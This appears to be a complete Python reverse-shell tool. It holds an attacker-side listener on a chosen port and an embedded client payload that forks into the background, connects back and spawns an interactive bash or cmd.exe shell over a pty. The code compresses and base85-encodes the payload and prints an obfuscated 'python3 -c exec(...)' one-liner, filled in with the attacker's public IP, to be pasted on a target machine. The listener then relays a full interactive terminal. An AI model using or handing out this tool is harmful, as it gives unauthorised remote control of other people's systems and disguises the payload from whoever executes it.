import fcntl
import os
import select
import socket
import logging
import struct
import sys
import termios
import atexit
import signal
import tty
import requests
import zlib
import base64
import urllib3.util.connection as urllib3_cn

client_code = (
    f"""import os,socket as S,fcntl,struct as T,sys as y,pty

u=T.unpack
k=os.fork
b=b""
p=pty.spawn
e=y.exit
a=y.argv

def r(fd):
	global b
	b+=os.read(fd,1024)
	r=b""
	while len(b)>=4:
		o,=u("!B",b[:1])
		if o==0:
			l,=u("!H",b[1:3])
			if len(b)<3+l:
				break
			r+=b[3:3+l]
			b=b[3+l:]
		else:
			w,h=u("!HH",b[1:5])
			b=b[5:]
			s=T.pack("HHHH",h,w,0,0)
			fcntl.ioctl(3,{termios.TIOCSWINSZ},s)
	return r or type("",(bytes,),{{"__bool__":lambda _:True}})()

if k()or k():e()
with S.socket({socket.AF_INET},{socket.SOCK_STREAM}) as s:
	if s.connect((a[1],int(a[2]))):e()
	s.setblocking(0)
	[os.dup2(s.fileno(),i)for i in(0,1,2)]
if y.platform[0]=="w":p(["cmd.exe"],stdin_read=r)
else:p(["/bin/bash","-i"],stdin_read=r)""".replace("\n\n", "\n")
    .strip()
    .encode()
)

urllib3_cn.allowed_gai_family = lambda: socket.AF_INET

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s %(levelname)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)


def pack(host=None, port=4444):
    ccode = base64.b85encode(zlib.compress(client_code)).decode()

    if host is None:
        # get public ip from https://ifconfig.me
        host = requests.get("https://ifconfig.me/ip").text.strip()

    print()
    print(
        f"""python3 -c 'import zlib,base64;exec(zlib.decompress(base64.b85decode("{ccode}")))' {host} {port}"""
    )
    print()


def pack_wndsize(w: int, h: int) -> bytes:
    """
    Send window size.
    """
    return struct.pack("!BHH", 0x1, w, h)


def pack_data(data: bytes) -> bytes:
    """
    Send data with the given operation.
    """
    return struct.pack("!BH", 0x0, len(data)) + data


def setup_term():
    mode = termios.tcgetattr(sys.stdin)
    tty.setraw(sys.stdin)
    atexit.register(lambda: termios.tcsetattr(sys.stdin, termios.TCSAFLUSH, mode))

    # make stdin non-blocking
    orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
    fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)


def main():
    if len(sys.argv) != 2:
        print("Usage: %s <port>" % sys.argv[0])
        sys.exit(1)

    port = int(sys.argv[1])

    pack(port=port)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        logging.info("Listening on 0.0.0.0:%d", port)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.listen(1)

        cli, addr = sock.accept()
        cli.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        cli.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
        cli.setblocking(False)
        logging.info("Accept a connection from %s", addr)

    logging.info("Become a shell")
    setup_term()

    # handle SIGWINCH
    def sigwinch_handler(signum, frame):
        w, h = os.get_terminal_size()
        cli.sendall(pack_wndsize(w, h))

    sigwinch_handler(None, None)
    signal.signal(signal.SIGWINCH, sigwinch_handler)

    # copy bidirectionally between the socket and the terminal
    # using select() to multiplex
    while True:
        # wait for data to read
        r, _, x = select.select([cli, sys.stdin], [], [cli, sys.stdin])
        if x:
            break
        if cli in r:
            # read from socket and write to stdout
            data = cli.recv(1024)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        if sys.stdin in r:
            # read from stdin and write to socket
            data = sys.stdin.buffer.read(1024)
            if not data:
                break
            cli.sendall(pack_data(data))

    logging.info("Connection closed")


if __name__ == "__main__":
    main()
